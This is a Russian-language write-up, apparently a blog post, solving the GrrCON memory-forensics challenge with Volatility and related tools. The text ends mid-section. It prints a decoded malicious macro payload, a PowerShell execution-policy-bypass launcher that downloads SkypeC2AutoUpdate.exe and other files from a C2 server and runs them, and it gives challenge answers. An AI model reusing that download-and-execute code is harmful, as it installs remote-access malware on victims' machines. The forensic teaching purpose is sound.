<div>
 <div class="article-formatted-body article-formatted-body article-formatted-body_version-2">
  <div xmlns="http://www.w3.org/1999/xhtml">
   <h2>Подготовка.</h2>
   <p>Хорошо подготовленный стенд – залог успеха в расследовании и анализе, поэтому начинаем с этапа подготовки. Установим ОС с уже необходимыми утилитами для расследования компьютерных инцидентов: <a href="https://www.sans.org/tools/sift-workstation/" rel="noopener noreferrer nofollow">SIFT</a> (от института SANS, используйте VPN, друзья). После загрузки открываем в VMware или VBox.</p>
   <p>Устанавливаем и заходим на SIFT (пароль от УЗ <strong>forensics</strong>), на этом этап подготовки не закончен, загрузим на SIFT архив из задания (<a href="https://cyberdefenders.org/blueteam-ctf-challenges/93" rel="noopener noreferrer nofollow">GrrCON</a>) от <strong>cyberdefenders.org</strong> (в архиве содержатся образы виртуальных машин) и после распаковки, сделаем экспорт месторасположения образа и профиля исследуемой операционной системы (профиль можно найти с использованием плагинов volatility <strong>imageinfo</strong> или <strong>kdbgscan</strong>) в переменные окружения, чтобы в дальнейшем не писать каждый раз эти аргументы:</p>
   <pre><code class="bash"> export VOLATILITY_LOCATION=file:///home/sansforensics/Desktop/GrrCon/ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem</code></pre>
   <pre><code class="bash">export VOLATILITY_PROFILE=Win7SP1x64</code></pre>
   <p>На этом с этапом подготовки заканчиваем и приступаем непосредственно к анализу.<br>В ходе анализа двух образов виртуальной машины *.vmem, нам предлагают ответить на <strong>16 вопросов</strong>, связанных с инцидентами на виртуальных машинах c ОС Windows7x64.</p>
   <p>Работать мы будем с уже предустановленной в SIFT утилитой для анализа дампов оперативной памяти <strong>volatility</strong> и дополнительными утилитами <strong>readpst</strong> для анализа *.pst файлов, <strong>olevba</strong> для анализа malware documents с проектами VBA, <strong>mactime</strong> из набора <strong>TheSleuthKit </strong>для парсинга таблицы <strong>$mft, clamscan </strong>опенсорсным антивирусным движком.</p>
   <h2>Расследование в первом файле виртуальной машины.</h2>
   <p>Вначале посмотрим, какие процессы запущены на первом скомпрометированном хосте при помощи плагина <strong>pslist</strong>(Рисунок 1). Для этого, выполним команду:</p>
   <pre><code class="bash">vol.py pslist</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/24c/831/c32/24c831c324e000c1181c5301808be273.png" alt="Рисунок 1 – список запущенных на хосте процессов в режиме реального времени." title="Рисунок 1 – список запущенных на хосте процессов в режиме реального времени." width="940" height="599" data-src="https://habrastorage.org/getpro/habr/upload_files/24c/831/c32/24c831c324e000c1181c5301808be273.png">
    <figcaption>
     Рисунок 1 – список запущенных на хосте процессов в режиме реального времени.
    </figcaption>
   </figure>
   <p>Давайте более детально посмотрим на дерево родительских и дочерних процессов, а также директории, откуда процесс был запущен (плагин <strong>pstree</strong> с флагом <strong>-v</strong>). Результат на рисунке 2.</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/263/2ee/4b3/2632ee4b31b2e844963e0ce1f61b3256.png" alt="Рисунок 2 – Вывод pstree -v." title="Рисунок 2 – Вывод pstree -v." width="986" height="754" data-src="https://habrastorage.org/getpro/habr/upload_files/263/2ee/4b3/2632ee4b31b2e844963e0ce1f61b3256.png">
    <figcaption>
     Рисунок 2 – Вывод pstree -v.
    </figcaption>
   </figure>
   <p>Можно заметить две интересных особенности для процесса SkypeC2AutoUpdate.exe (PID 1364):</p>
   <ol>
    <li><p><strong>Путь из которого он был запущен</strong> (часто вредоносы запускаются из пользовательской директории <strong>%TEMP %</strong>).</p></li>
    <li><p><strong>Отсутствие информации о родительском процессе 2528</strong>.</p></li>
   </ol>
   <p>Гугл сказал, что у Dr.WEB в <a href="https://vms.drweb-av.pl/virus/?i=7720463" rel="noopener noreferrer nofollow">анализе</a> трояна, использовался процесс с наименованием SkypeC2AutoUpdate.exe. Но пока рано делать выводы. Соберём чуть больше информации об учетной записи из под которой запустили процесс(рисунок 3):</p>
   <pre><code class="bash">vol.py getsids -p 1364</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/82f/eb7/b79/82feb7b7965be8b6aff192308cc096f9.png" alt="Рисунок 3 – получение информации о SIDS пользователей, запустивших процесс." title="Рисунок 3 – получение информации о SIDS пользователей, запустивших процесс." width="940" height="381" data-src="https://habrastorage.org/getpro/habr/upload_files/82f/eb7/b79/82feb7b7965be8b6aff192308cc096f9.png">
    <figcaption>
     Рисунок 3 – получение информации о SIDS пользователей, запустивших процесс.
    </figcaption>
   </figure>
   <p>На рисунке 3 мы видим, что процесс запущен из под пользователя <strong>phillip.price</strong>, который входит в доменную группу и запустил процесс после входа через консоль.</p>
   <p>Не менее интересными будут и сетевые соединения. Чтобы их посмотреть, воспользуемся командой:</p>
   <pre><code class="bash">vol.py netscan</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/4ec/037/3d6/4ec0373d68560f6003f231f365c50eae.png" alt="Рисунок 4 – соединения и процессы, породившие их." title="Рисунок 4 – соединения и процессы, породившие их." width="940" height="228" data-src="https://habrastorage.org/getpro/habr/upload_files/4ec/037/3d6/4ec0373d68560f6003f231f365c50eae.png">
    <figcaption>
     Рисунок 4 – соединения и процессы, породившие их.
    </figcaption>
   </figure>
   <p>Видно сторонние IPv4 и порты подключения, для процессов:</p>
   <ul>
    <li><p>SkypeC2AutoUpdate.exe: 54.174.131.235:80, 120.122.236.3;</p></li>
    <li><p>OUTLOOK.EXE: 66.147.240.99:993, 64.4.26.155:80.</p></li>
   </ul>
   <p>В 5 вопросе задания нас просят указать e-mail отправителя фишингового письма (<strong>What was the sender's email address that delivered the phishing email?</strong>), найдём файлы с расширением <strong>*.eml</strong> или <strong>*.pst</strong> (такое расширение имеют файлы Outlook и Microsoft Exchange, могут содержать как сами письма, так и папки, контакты, адреса, вложения и.т.д).</p>
   <p>В первом случае для *.eml файлов поиск результатов не дал, а вот во втором мы получаем несколько файлов с расширением pst.<br>Команда для поиска (результат на рисунке ниже):</p>
   <pre><code class="bash">vol.py filescan | grep pst$</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/c27/def/a25/c27defa25f46962517b88a27b10f4ca0.png" width="940" height="120" data-src="https://habrastorage.org/getpro/habr/upload_files/c27/def/a25/c27defa25f46962517b88a27b10f4ca0.png">
    <figcaption></figcaption>
   </figure>
   <p>Сдампим файлы по имени, в специально созданную директорию pst2:</p>
   <pre><code class="bash">vol.py dumpfiles -n -i -r phillip.price@e-corp.biz.pst$ -D pst2 </code></pre>
   <p>А теперь приступим к анализу файлов. Для этого воспользуемся утилитой <strong>readpst</strong> с флагом <strong>-S</strong> (<a href="https://linux.die.net/man/1/readpst" rel="noopener noreferrer nofollow">подробнее</a>):</p>
   <pre><code class="bash">readpst -S file.2692.0xfffffa80042dcf10.phillip.price@e-corp.biz.pst.dat</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/df7/da8/9c7/df7da89c7fbfd67db986e6d57997af3b.png" width="940" height="297" data-src="https://habrastorage.org/getpro/habr/upload_files/df7/da8/9c7/df7da89c7fbfd67db986e6d57997af3b.png">
    <figcaption></figcaption>
   </figure>
   <p>Как мы видим, во входящих было сохранено 13 элементов, среди которых письма и вложение, в нашем случае вложение из письма №<strong>13</strong>, поэтому начинается так: <strong>13</strong>-bank_statement_088452.doc. Давайте выведем на экран содержимое писем. (рисунок 7 и 8)<br></p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/56f/60c/ea3/56f60cea31b35ee98766b6ed13247021.png" alt="Рисунок 7 – отправитель письма с вложением." title="Рисунок 7 – отправитель письма с вложением." width="940" height="425" data-src="https://habrastorage.org/getpro/habr/upload_files/56f/60c/ea3/56f60cea31b35ee98766b6ed13247021.png">
    <figcaption>
     Рисунок 7 – отправитель письма с вложением.
    </figcaption>
   </figure>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/837/cc0/3f4/837cc03f497abd2777e219266195085d.png" alt="Рисунок 8 – текст и наличие вложения (attachment’a) с его названием." title="Рисунок 8 – текст и наличие вложения (attachment’a) с его названием." width="940" height="649" data-src="https://habrastorage.org/getpro/habr/upload_files/837/cc0/3f4/837cc03f497abd2777e219266195085d.png">
    <figcaption>
     Рисунок 8 – текст и наличие вложения (attachment’a) с его названием.
    </figcaption>
   </figure>
   <p>На рисунках видно, кто отправитель письма с вложением <strong>karenmiles@t-online.de – ответ на 5 вопрос </strong>(<strong>What was the sender's email address that delivered the phishing email?</strong>) (на рисунке 8 показано наличие вложения Content-Disposition: <strong>attachment</strong>).</p>
   <p>Также не поленимся просмотреть другие письма и в письме <strong>№12</strong> обнаружим интересное содержимое (рисунок 9) с шантажем (темой <strong>Ransom request</strong>) и требованием направить <strong>5 биткоинов</strong> на кошелёк по адресу <strong>25UMDkGKBe484WSj5Qd8DhK6xkMUzQFydY</strong> (ответ на <strong>№7 вопрос What is the bitcoin wallet address that ransomware was demanded?</strong>), иначе будет осуществлена DDoS атака:</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/254/7ae/0b9/2547ae0b9647c264185a1e17ab1040ab.png" alt="Рисунок 9 – требование о выкупе из письма №12." title="Рисунок 9 – требование о выкупе из письма №12." width="940" height="1048" data-src="https://habrastorage.org/getpro/habr/upload_files/254/7ae/0b9/2547ae0b9647c264185a1e17ab1040ab.png">
    <figcaption>
     Рисунок 9 – требование о выкупе из письма №12.
    </figcaption>
   </figure>
   <p>Теперь давайте изучим содержимое документа <strong>13-bank_statement_088452.doс</strong> из письма, для этого используем одну из набора утилит <strong>oletools</strong>:</p>
   <pre><code class="bash">olevba phillip.price@e-corp.biz/Inbox/13-bank_statement_088452.doс</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/640/a06/b2b/640a06b2b800a81fb92f166342794666.png" alt="Рисунок 10 – VBA скрипт в документе 13-bank_statement_088452.doс." title="Рисунок 10 – VBA скрипт в документе 13-bank_statement_088452.doс." width="940" height="374" data-src="https://habrastorage.org/getpro/habr/upload_files/640/a06/b2b/640a06b2b800a81fb92f166342794666.png">
    <figcaption>
     Рисунок 10 – VBA скрипт в документе 13-bank_statement_088452.doс.
    </figcaption>
   </figure>
   <p>После просмотра содержимого документа, можно отметить, что имеются:</p>
   <ol>
    <li><p>Функция <strong>Img_Painted </strong>(типа <strong>AutoExec</strong>), которая отрабатывает после открытия документа.</p></li>
    <li><p>Подозрительные функции <strong>Open</strong>, <strong>Run(UsoJar,0)</strong>, <strong>CreateObject</strong> и закодированное содержимое.</p></li>
   </ol>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/8bc/d5d/c33/8bcd5dc33cd87f1a6f5481c41a85f44a.png" alt="Рисунок 11 – VBA code snippet." title="Рисунок 11 – VBA code snippet." width="940" height="503" data-src="https://habrastorage.org/getpro/habr/upload_files/8bc/d5d/c33/8bcd5dc33cd87f1a6f5481c41a85f44a.png">
    <figcaption>
     Рисунок 11 – VBA code snippet.
    </figcaption>
   </figure>
   <p>Как мы заметили, выполняется функция <strong>Run(UsoJar,0), </strong>давайте разберёмся, что выполняется в данной функции (запуск которой видно на рисунке 11, и она же является ответом на <strong>вопрос 10 What Public Function in the word document returns the full command string that is eventually run on the system?</strong>). Итак, после небольшого дебага, мы получаем из содержимого функции следующее:</p>
   <pre><code class="powershell">powershell -ep bypass -nop -encodedCommand ZgBvAHIAZQBhAGMAaAAgACgAJABpACAAaQBuACAAQAAoACIAUwBrAHkAcABlAEMAMgBBAHUAdABvAFUAcABkAGEAdABlAC4AZQB4AGUAIgAsACIAVABlAGEAbQBWAGkAZQB3AGUAcgBfAEQAZQBzAGsAdABvAHAAL…&lt;code snippet&gt;…HYAOgBUAEUATQBQ </code></pre>
   <p>Видно, что выполняются закодированные в base64 командлеты в обход Execution Policy, аналогичную технику использовала <strong>APT Kimsuky</strong> в малдоках 2022 года, разборы других документов <strong>APT</strong> можно найти <a href="http://ant0nyn0p.ru/" rel="noopener noreferrer nofollow">здесь</a>. После декодирования через <strong>base64 -d</strong>:</p>
   <pre><code class="bash">echo "ZgBvAHIAZQBhAGMAaAAgACgAJABpACAAaQBuACAAQAAoACIAUwBrAHkAcABlAEMAMgBBAHUAdABvAFUAcABkAGEAdABlAC4AZQB4AGUAIgAsACIAVABlAGEAbQBWAGkAZQB3AGUAcgBfAEQAZQBzAGsAdABvAHAAL…&lt;code snippet&gt;…HYAOgBUAEUATQBQ" | base64 -d </code></pre>
   <p>Мы получим, собственно, сами командлеты:</p>
   <pre><code class="powershell">foreach ($i in @("SkypeC2AutoUpdate.exe","TeamViewer_Desktop.exe","TeamViewer_Resource_en.dll",
"avicap32.dll","tv_w32.dll","tv_w32.exe","tv_x64.dll","tv_x64.exe","tvr.cfg","vpn.exe"))
{
(New-Object System.Net.WebClient).DownloadFile("http://54.174.131.235/files/$i", "$env:temp/$i")
};
Start-Process -FilePath "$env:TEMP/SkypeC2AutoUpdate.exe" -WorkingDirectory "$env:TEMP</code></pre>
   <p>Среди которых массив из имён файлов: <strong>SkypeC2AutoUpdate.exe</strong>, <strong>TeamViewer_Desktop.exe</strong> и.др, которые загружаются с сервера http://<strong>54.174.131.235</strong>/files/$i (этот адрес мы уже видели на рисунке 4 когда просматривали подключения и он же является ответом на вопрос <strong>№2 What is the C2 server IP address?</strong>, &nbsp;в папку <strong>%TEMP%</strong>, как мы уже также ранее с вами подметили на рисунке 2, а после запускается и сам процесс (с вредоносным кодом) <strong><u>SkypeC2AutoUpdate.exe</u></strong> (это ответ на <strong>1-й вопрос:</strong> <strong>What is the PID the malicious file is running under?</strong>)😉&nbsp;</p>
   <p>Сам процесс SkypeC2AutoUpdate.exe – является вполне легитимным, однако одна из библиотек <strong><u>avicap32.dll</u></strong>, которая также дропается в директорию %TEMP% &nbsp;с этим же процессом и код из которой он импортирует содержит вредоносный код (атака <a href="https://attack.mitre.org/techniques/T1574/002/" rel="noopener noreferrer nofollow">DLL Side-Loading</a>).</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/064/b76/ddc/064b76ddcee848afe7bc59e08fce1ccd.png" alt="Проверка avicap32.dll на VT." title="Проверка avicap32.dll на VT." width="940" height="412" data-src="https://habrastorage.org/getpro/habr/upload_files/064/b76/ddc/064b76ddcee848afe7bc59e08fce1ccd.png">
    <figcaption>
     Проверка avicap32.dll на VT.
    </figcaption>
   </figure>
   <p>На следующем этапе сдампим процесс в памяти <strong><u>SkypeC2AutoUpdate.exe</u></strong> чтобы внимательно изучить его содержимое в памяти, для этого выполним команду:</p>
   <pre><code class="bash">vol.py memdump -p 1364 -D .</code></pre>
   <p>После чего поищем запросы к серверу:</p>
   <pre><code class="bash">strings -a 1364.dmp | grep -A4 "54.174.131.235"</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/cff/054/bf3/cff054bf38c7823b086084bc9a5615a4.png" alt="Рисунок -13 поиск связи с C2 сервером." title="Рисунок -13 поиск связи с C2 сервером." width="940" height="307" data-src="https://habrastorage.org/getpro/habr/upload_files/cff/054/bf3/cff054bf38c7823b086084bc9a5615a4.png">
    <figcaption>
     Рисунок -13 поиск связи с C2 сервером.
    </figcaption>
   </figure>
   <p>В запросе, кроме имени пользователя и хоста, мы можем увидеть ID (ответ на <strong>8</strong> <strong>вопрос What is the ID given to the system by the malicious file for remote access?</strong>) и версию <strong>TeamViewer</strong>, которая является ответом на <strong>вопрос №3 What is the Teamviewer version abused by the malicious file?</strong></p>
   <p>Сразу скажу, что экспорт пакетов и анализ в <strong>шарке</strong> исчерпывающей информации не предоставил, кроме самих запросов к серверу <strong>54.174.131.235</strong>, поэтому пошли путём выше, через поиск запросов в дампе процесса.</p>
   <p>Изменив кодировку для утилиты strings, выполним аналогичный поиск:</p>
   <pre><code class="bash">string -el 1364.dmp | grep -A10 -B10 "54.174.131.235"</code></pre>
   <p>После мы также найдём пароль, который передавался в качестве одного из аргументов и заодно ответим на <strong>4</strong> <strong>вопрос: What password did the malicious file use to enable remote access to the system?</strong> (рис 14).<br></p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/552/5ea/659/5525ea659f65d8d7df3ed01bded618f7.png" alt="Рисунок 14 – пароль, переданный при запуске процесса SkypeC2AutoUpdate." title="Рисунок 14 – пароль, переданный при запуске процесса SkypeC2AutoUpdate." width="940" height="480" data-src="https://habrastorage.org/getpro/habr/upload_files/552/5ea/659/5525ea659f65d8d7df3ed01bded618f7.png">
    <figcaption>
     Рисунок 14 – пароль, переданный при запуске процесса SkypeC2AutoUpdate.
    </figcaption>
   </figure>
   <p>Без ответа в первой части остался только вопрос №9: <strong>What is the IPv4 address the actor last connected to the system with the remote access tool?</strong></p>
   <p>И чтобы на него ответить, проанализируем дамп процесса 1364 с паттерном для поиска всех IP адресов и ключевому слову teamviewer:</p>
   <pre><code class="bash">strings -a 1364.dmp | grep -A3 -B3 -E '([0-9]{1,3}\.[0-9]{1,3}\.)[0-9]{1,3}\.[0-9]{1,3}' | grep -A3 -B3 teamviewer</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/732/c5f/d63/732c5fd635356bddfdd3ab19ce1e99ca.png" alt="Рисунок 15 – IP адрес RAT (remote access tool)." title="Рисунок 15 – IP адрес RAT (remote access tool)." width="940" height="274" data-src="https://habrastorage.org/getpro/habr/upload_files/732/c5f/d63/732c5fd635356bddfdd3ab19ce1e99ca.png">
    <figcaption>
     Рисунок 15 – IP адрес RAT (remote access tool).
    </figcaption>
   </figure>
   <p>Возможно, кто-то из читателей знает ещё приёмы поиска подключений RAT, например: где в структуре EPROCESS хранится подобная информация? Буду рад дельным советам =)</p>
   <p><strong>Анализ второго образа виртуальной машины.</strong></p>
   <p>У нас ещё 6 вопросов и ответы на них находятся во втором образе <strong>ecorpwin7.vmem</strong>. Поэтому, прежде чем приступить к анализу, заменим расположение нашего образа в переменной окружения:</p>
   <pre><code class="bash"> export VOLATILITY_LOCATION=file:///home/sansforensics/Desktop/GrrCon/ecorpwin7/ecorpwin7-e73257c4.vmem</code></pre>
   <p>Профиль подойдёт прежний <strong>Win7x64SP1.</strong></p>
   <p>Посмотрим поверхностно на запущенные процессы и их timestamps, родителей, аргументов и другие параметры, используя плагины:</p>
   <ul>
    <li><p><strong>pslist</strong> - читает <strong>_EPROCESS</strong> double linked список;</p></li>
    <li><p><strong>psscan</strong> – считывает структуры <strong>_EPROCESS</strong>, отображает завершённые процессы, иногда помогает находить руткиты;</p></li>
    <li><p><strong>pstree</strong> – отображает дерево процессов, родителей и дочерние процессы, с флагом -v (от verbose) выводит аргументы, с которыми был запущен тот или иной процесс. Для удобства просмотра можно вывести в виде графа указав тип вывода <strong>dot</strong> (по дефолту установлен text): <br> <strong>--output=dot --output-file=pstree.dot</strong> (результат на рисунке 16).</p>
     <figure class="full-width ">
      <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/8b1/420/e61/8b1420e61ce536f21a6e0d2f8669352c.png" alt="Рисунок 16 – Фрагмент дерева процессов." title="Рисунок 16 – Фрагмент дерева процессов." width="940" height="627" data-src="https://habrastorage.org/getpro/habr/upload_files/8b1/420/e61/8b1420e61ce536f21a6e0d2f8669352c.png">
      <figcaption>
       Рисунок 16 – Фрагмент дерева процессов.
      </figcaption>
     </figure></li>
   </ul>
   <p>Просматривая информацию о процессах, мы увидим запущенные процессы <strong>Outlook.exe </strong>(попробуем поискать файлы *eml *.pst), а также процессы <strong>rundll32.exe</strong> (служат для запуска *.dll файлов) родителем которых является <strong>svchost.exe</strong>, эти процессы запускаются с аргументами: <strong>путь до библиотеки test.dll</strong> и другими аргументами (подчёркнуты красным), которые принимает запущенная библиотека (<strong>vol.py pstree -v</strong>):</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/bda/d88/e61/bdad88e6131aa8aad1b71f592ea34949.png" alt="Рисунок 17 – аргументы rundll32.exe." title="Рисунок 17 – аргументы rundll32.exe." width="940" height="195" data-src="https://habrastorage.org/getpro/habr/upload_files/bda/d88/e61/bdad88e6131aa8aad1b71f592ea34949.png">
    <figcaption>
     Рисунок 17 – аргументы rundll32.exe.
    </figcaption>
   </figure>
   <p>Заодно посмотрим информацию о сетевых соединениях:</p>
   <pre><code class="bash">vol.py netscan</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/1d0/ddc/450/1d0ddc450717b7da6a3e0643b20fa582.png" width="940" height="255" data-src="https://habrastorage.org/getpro/habr/upload_files/1d0/ddc/450/1d0ddc450717b7da6a3e0643b20fa582.png">
    <figcaption></figcaption>
   </figure>
   <p>Обратите внимание, что процесс svchost.exe (PID: 288), который является родителем "<strong>rundll32.exe test.dll GnrkQr 2</strong>"<strong> </strong>открывал соединение с сервером по адресу <strong>52.90.110.169</strong> порт <strong>80</strong>. (этот адрес – ответ на <strong>вопрос №14 What is the IP address of the c2 server for the malicious file?</strong>).</p>
   <p>Ранее мы выяснили, что запущен <strong>Outlook.exe</strong>, и поэтому произведём поиск и дамп файлов <strong>*.pst</strong>, команды аналогичные выполняемым командам в первом файле виртуальной машины:</p>
   <pre><code class="bash">vol.py filescan | grep pst$
vol.py dumpfiles -n -i -r Outlscott.knowles@e-corp.biz-00000004.pst$ -D .
readpst -S file.2496.0xfffffa80034e9850.Outlscott.knowles@e-corp.biz-00000004.pst.dat </code></pre>
   <p>Мы видим, что почту <strong>scott.knowles@e-corp.biz</strong> приходили довольно интересные письма (на рисунках ниже), среди которых письмо с файлом <strong>Important_ECORP_Lawsuit_Washington_Leak.rtf </strong>от некого <strong><em>lloydchung@allsafecybersec.com</em></strong> (ответ на <strong>вопрос №15 What is the email address that sent the phishing email?</strong>)</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/74a/860/315/74a86031567fc1080e65e006f8c11d12.png" alt="Рисунок 18 – письмо с вложением." title="Рисунок 18 – письмо с вложением." width="940" height="881" data-src="https://habrastorage.org/getpro/habr/upload_files/74a/860/315/74a86031567fc1080e65e006f8c11d12.png">
    <figcaption>
     Рисунок 18 – письмо с вложением.
    </figcaption>
   </figure>
   <p>Из интересного также - пересланное письмо от <strong>phillip.price@e-corp.biz</strong> (мы уже анализировали ранее на рисунке 9), который переслал письмо с шантажем требованием о выкупе в 5 биткоинов и высказал своё "негодование" нашему <strong>scott.knowles@e-corp.biz </strong>с "просьбой" во всём разобраться.</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/293/eb9/c72/293eb9c720571ed8dae2c50a01322ea2.png" alt="Пересланное письмо с требование заплатить выкуп и комментарием от phillip.price." title="Пересланное письмо с требование заплатить выкуп и комментарием от phillip.price." width="940" height="397" data-src="https://habrastorage.org/getpro/habr/upload_files/293/eb9/c72/293eb9c720571ed8dae2c50a01322ea2.png">
    <figcaption>
     Пересланное письмо с требование заплатить выкуп и комментарием от phillip.price.
    </figcaption>
   </figure>
   <p>Двигаемся дальше, в 11 вопросе нас просят посчитать хэш сумму файла <strong>Important_ECORP_Lawsuit_Washington_Leak.rtf</strong> из письма, но забегая вперёд, скажу, что файл битый если извлекать его из *pst.</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/939/7d4/dcf/9397d4dcff8d1557aaef7bfd322358cb.png" alt="Битый файл (просмотр при помощи xxd)" title="Битый файл (просмотр при помощи xxd)" width="940" height="564" data-src="https://habrastorage.org/getpro/habr/upload_files/939/7d4/dcf/9397d4dcff8d1557aaef7bfd322358cb.png">
    <figcaption>
     Битый файл (просмотр при помощи xxd)
    </figcaption>
   </figure>
   <p>Чтобы дать верный ответ, пришлось найти данный файл в памяти, сдампить и посчитать хэш сумму, но прежде удалить нулевые байты в конце:</p>
   <pre><code class="bash">vol.py filescan | grep rtf$
vol.py dumpfiles -Q 0x000000007d6b3850 -D .
sed 's/\x0//g' file.None.0xfffffa80040b3260.dat &gt; Important_ECORP_Lawsuit_Washington_Leak.rtf</code></pre>
   <p>И после посчитать MD5 hash чтобы ответить на вопрос:<br>00e4136876bf4c1069ab9c4fe40ed56f</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/8f5/e46/50b/8f5e4650b84f3c0740062ddb150f8c87.png" alt="Рисунок 19 – хэш документа из письма." title="Рисунок 19 – хэш документа из письма." width="940" height="139" data-src="https://habrastorage.org/getpro/habr/upload_files/8f5/e46/50b/8f5e4650b84f3c0740062ddb150f8c87.png">
    <figcaption>
     Рисунок 19 – хэш документа из письма.
    </figcaption>
   </figure>
   <p>После сканирования файла <strong>Important_ECORP_Lawsuit_Washington_Leak.rtf</strong> опенсорсным антивирусным движком <strong>clamscan</strong> видно, что в файле найден эксплойт <strong>CVE_2010_3333-5. </strong></p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/a2a/455/762/a2a4557626e9b87ace2647c475c86de0.png" alt="" title="" width="1494" height="280" data-src="https://habrastorage.org/getpro/habr/upload_files/a2a/455/762/a2a4557626e9b87ace2647c475c86de0.png">
    <figcaption></figcaption>
   </figure>
   <p>На <strong>рисунке 17</strong> мы заметили, что запускается библиотека <strong>test.dll </strong>с параметрами <strong>GnrkQr 2</strong>. Давайте сдампим библиотеку в директорию maldll:</p>
   <pre><code class="bash">vol.py dumpfiles -n -i -r test.dll -D maldll</code></pre>
   <p>После также просканируем полученные файлы опенсорсным антивирусным движком <strong>clamscan</strong> с флагом <strong>-r</strong> (рисунок 20)</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/71e/9d3/250/71e9d32506365e2bd2f6114630821790.png" alt="Рисунок 20 – сканирование файлов с использованием движка clamscan." title="Рисунок 20 – сканирование файлов с использованием движка clamscan." width="940" height="228" data-src="https://habrastorage.org/getpro/habr/upload_files/71e/9d3/250/71e9d32506365e2bd2f6114630821790.png">
    <figcaption>
     Рисунок 20 – сканирование файлов с использованием движка clamscan.
    </figcaption>
   </figure>
   <p>Clamscan нашёл <strong>Win.Malware.Korplug-6 </strong>в нашей библиотеке. На <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.plugx" rel="noopener noreferrer nofollow">malpedia</a> можно найти описание этого Remote Access Trojan (RAT), а также его наиболее распространённое наименование <strong>PlugX </strong>(ответ на <strong>12 вопрос: What is the common name of the malicious file that gets loaded?</strong>).</p>
   <h2>Ищем артефакты в Master File Table.</h2>
   <p>Чтобы ответить на вопрос <strong>№13 </strong>(<strong>What password does the attacker use to stage the compressed file for exfil?</strong>) посмотрим какие файлы недавно создавались и поищем среди них файлы архивов с расширением <strong>.rar|.zip|.7z|.gzip</strong>. Искать недавно созданные файлы мы будем в таблице <strong>$mft</strong> (<strong>Master File Table</strong> – сердце файловой системе NTFS, эта таблица хранит информацию о времени создания файла (<strong>Birthday</strong> of file), времени изменения атрибутов $Data &amp; $Index (<strong>Modified</strong>), изменение записи в таблице $mft (<strong>Сhange</strong> in mft) и время последнего обращения к содержимому файла (<strong>Accessed</strong>), а также флагах удаления, размере и много других атрибутов, но в этой статье нам понадобится время) итого:</p>
   <p><strong>MACB</strong> – <strong>Modified</strong>, <strong>Accessed</strong>, <strong>Change</strong>, <strong>Birthday</strong> of file. Эти данные предоставляют важные временные метки, о которых я сказал ранее. Если погружаться глубже, временные метки хранятся в атрибутах: <strong>$Standard Information</strong> &amp; <strong>$File Name</strong>, в каждом по 4 <strong>MACB</strong>. Когда файл создаётся, изменяются все 4 метки у обоих атрибутов. Здесь я рассказывать подробно о файловой системе NTFS и её особенностях не буду, думаю выйдет отдельная статья, посвящённая ей и восстановлению удалённых файлов.<br>Давайте первым делом сдампим $mft из памяти, но не в текстовом формате (его сложно обрабатывать), а в формате <strong>body</strong>:</p>
   <pre><code class="bash">vol.py mftparser --output=body -D . --output-file=grrcon_mft.body</code></pre>
   <p>Особенность этого формата заключается в том, что его поддерживает утилита <strong>mactime</strong> из <a href="https://www.sleuthkit.org/" rel="noopener noreferrer nofollow">SleuthToolKit</a>. Теперь, давайте выведем последние 1000 строк с использованием данной утилиты, а также отфильтруем: строки с записью NULL, оставим только строки с <strong>macb </strong>(т.к. как упомянул выше, когда файл создается меняются все 4 временные метки), MFT STD_INFO и расширением «<strong>rar|zip|7z|gzip</strong>»:</p>
   <pre><code class="bash">mactime -b grrcon_mft.body -d -z UTC | tail -1000f | egrep -v 'NULL' | egrep 'macb' | egrep 'MFT STD_INFO' | egrep 'rar|zip|7z|gzip'</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/fb3/65c/cf0/fb365ccf0cfc6e81297cd49364bdc8d8.png" width="1827" height="113" data-src="https://habrastorage.org/getpro/habr/upload_files/fb3/65c/cf0/fb365ccf0cfc6e81297cd49364bdc8d8.png">
    <figcaption></figcaption>
   </figure>
   <p>Из вывода команды следует, что файл <strong>reports.rar</strong> был создан 05.10.2016 в <strong>03:00:25</strong> по UTC. Поищем команды на создание файла в дампе:</p>
   <pre><code class="bash">strings -el ecorpwin7-e73257c4.vmem | egrep -A5 -B5 'reports.rar'</code></pre>
   <figure class="full-width ">
